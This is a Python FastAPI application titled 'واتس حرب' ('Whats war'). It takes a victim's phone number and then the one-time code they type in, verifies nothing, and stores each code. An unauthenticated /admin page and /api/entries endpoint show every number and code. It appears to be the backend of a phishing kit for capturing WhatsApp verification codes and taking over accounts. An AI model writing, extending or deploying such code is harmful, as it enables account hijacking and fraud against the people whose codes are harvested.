from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from datetime import datetime
from threading import Lock
import re

app = FastAPI(title="واتس حرب")
templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

store = []
store_lock = Lock()
seq = 10025

def clean_country_code(code: str) -> str:
    digits = re.sub(r"\D", "", code or "")
    return digits[:4] or "966"

def clean_phone(phone: str) -> str:
    digits = re.sub(r"\D", "", phone or "")
    return digits[:15]

def clean_code(code: str) -> str:
    return re.sub(r"\D", "", code or "")[:6]

@app.get("/", response_class=HTMLResponse)
async def user_home(request: Request):
    return templates.TemplateResponse("user.html", {"request": request})

@app.post("/start")
async def start(country_code: str = Form(...), phone: str = Form(...)):
    global seq
    cc = clean_country_code(country_code)
    ph = clean_phone(phone)
    if len(ph) < 6:
        return RedirectResponse(url="/?error=1", status_code=303)

    with store_lock:
        seq += 1
        entry = {
            "id": seq,
            "country_code": cc,
            "phone": ph,
            "entered_code": "",
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M"),
            "verified_at": "",
            "status": "قيد المعالجة",
        }
        store.insert(0, entry)

    return RedirectResponse(url=f"/verify/{entry['id']}", status_code=303)

@app.get("/verify/{entry_id}", response_class=HTMLResponse)
async def verify_page(request: Request, entry_id: int):
    with store_lock:
        entry = next((x for x in store if x["id"] == entry_id), None)
    if not entry:
        return RedirectResponse(url="/", status_code=303)
    return templates.TemplateResponse("verify.html", {"request": request, "entry": entry})

@app.post("/verify/{entry_id}")
async def verify_submit(entry_id: int, code: str = Form(...)):
    clean = clean_code(code)
    if len(clean) < 1:
        return RedirectResponse(url=f"/verify/{entry_id}?error=1", status_code=303)

    with store_lock:
        entry = next((x for x in store if x["id"] == entry_id), None)
        if not entry:
            return RedirectResponse(url="/", status_code=303)
        entry["entered_code"] = clean
        entry["verified_at"] = datetime.now().strftime("%Y-%m-%d %H:%M")
        entry["status"] = "مكتملة"

    return RedirectResponse(url=f"/thanks/{entry_id}", status_code=303)

@app.get("/thanks/{entry_id}", response_class=HTMLResponse)
async def thanks(request: Request, entry_id: int):
    with store_lock:
        entry = next((x for x in store if x["id"] == entry_id), None)
    if not entry:
        return RedirectResponse(url="/", status_code=303)
    return templates.TemplateResponse("thanks.html", {"request": request, "entry": entry})

@app.get("/admin", response_class=HTMLResponse)
async def admin(request: Request):
    with store_lock:
        rows = list(store)

    stats = {
        "total": len(rows),
        "done": sum(1 for x in rows if x["status"] == "مكتملة"),
        "processing": sum(1 for x in rows if x["status"] == "قيد المعالجة"),
        "rejected": sum(1 for x in rows if x["status"] == "مرفوضة"),
    }
    return templates.TemplateResponse("admin.html", {
        "request": request,
        "rows": rows,
        "stats": stats
    })

@app.get("/api/entries")
async def api_entries():
    with store_lock:
        return JSONResponse({"entries": list(store)})
